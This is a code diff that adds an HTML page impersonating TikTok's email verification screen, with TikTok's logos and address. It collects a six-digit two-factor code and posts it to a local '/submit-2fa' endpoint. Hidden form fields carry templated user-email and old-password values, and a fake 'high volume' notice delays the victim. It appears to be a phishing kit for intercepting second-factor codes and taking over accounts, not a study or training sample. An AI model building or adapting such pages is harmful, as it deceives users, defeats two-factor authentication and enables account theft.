@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TikTok | Enter Verification Code</title>
+    <link
+      rel="icon"
+      href="https://www.tiktok.com/favicon.ico"
+      type="image/x-icon"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "TikTokFont", Arial, sans-serif;
+      }
+
+      body {
+        background-color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        color: #333;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 420px;
+        padding: 40px 32px;
+        border: 1px solid #eee;
+        border-radius: 12px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
+        display: flex;
+        flex-direction: column;
+        height: auto;
+      }
+
+      .logo-container {
+        text-align: center;
+        margin-bottom: 24px;
+      }
+
+      .logo-container img {
+        height: 32px;
+        margin: 0 4px;
+        vertical-align: middle;
+      }
+
+      .notice {
+        background-color: #fff5f5;
+        color: #d93025;
+        font-size: 13px;
+        padding: 10px 16px;
+        border: 1px solid #ffe5e5;
+        border-radius: 8px;
+        margin-bottom: 24px;
+        text-align: center;
+      }
+
+      h1 {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 16px;
+        text-align: center;
+      }
+
+      p.description {
+        font-size: 14px;
+        text-align: center;
+        margin-bottom: 24px;
+        color: #666;
+      }
+
+      .code-inputs {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
+
+      .code-inputs input {
+        width: 48px;
+        height: 48px;
+        font-size: 24px;
+        text-align: center;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+      }
+
+      button.submit-button {
+        width: 100%;
+        padding: 12px;
+        background-color: #fe2c55;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      button.submit-button:hover {
+        background-color: #e0264b;
+      }
+
+      a.resend-link {
+        display: block;
+        margin-top: 20px;
+        font-size: 13px;
+        text-align: center;
+        color: #fe2c55;
+        text-decoration: none;
+      }
+
+      a.resend-link:hover {
+        text-decoration: underline;
+      }
+
+      .footer {
+        text-align: center;
+        font-size: 12px;
+        color: #aaa;
+        margin-top: 24px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="logo-container">
+        <img
+          src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tns/article/static/build/_assets/logo-dark-d62c3812fbf2f687daa9.svg"
+          alt="TikTok Logo Icon"
+        />
+        <img
+          src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tns/article/static/build/_assets/logo-text-dark-d795c282c11fef16f8fa.svg"
+          alt="TikTok Logo Text"
+        />
+      </div>
+
+      <div class="notice">
+        We're currently experiencing high volumes of requests, so it may take a few minutes for your email to arrive.
+      </div>
+
+      <h1>Enter Verification Code</h1>
+      <p class="description">
+        We've sent a 6-digit code to your email. Please enter it below.
+      </p>
+
+      <form id="code-form" method="POST" action="/submit-2fa">
+        <div class="code-inputs">
+          <input type="text" name="code1" maxlength="1" required />
+          <input type="text" name="code2" maxlength="1" required />
+          <input type="text" name="code3" maxlength="1" required />
+          <input type="text" name="code4" maxlength="1" required />
+          <input type="text" name="code5" maxlength="1" required />
+          <input type="text" name="code6" maxlength="1" required />
+        </div>
+
+        <input type="hidden" name="email" value="{user-email}" />
+        <input type="hidden" name="email" value="{old-password}" />
+
+        <button type="submit" class="submit-button">Verify</button>
+      </form>
+
+      <div class="footer">TikTok 5800 Bristol Pkwy, Culver City, CA 90230</div>
+    </div>
+
+    <script>
+      const inputs = document.querySelectorAll('.code-inputs input');
+
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+
+      const form = document.getElementById('code-form');
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const code = Array.from(inputs)
+          .map((input) => input.value)
+          .join('');
+        console.log('Entered Code:', code);
+        // Submit your real form here
+        form.submit();
+      });
+    </script>
+  </body>
+</html>
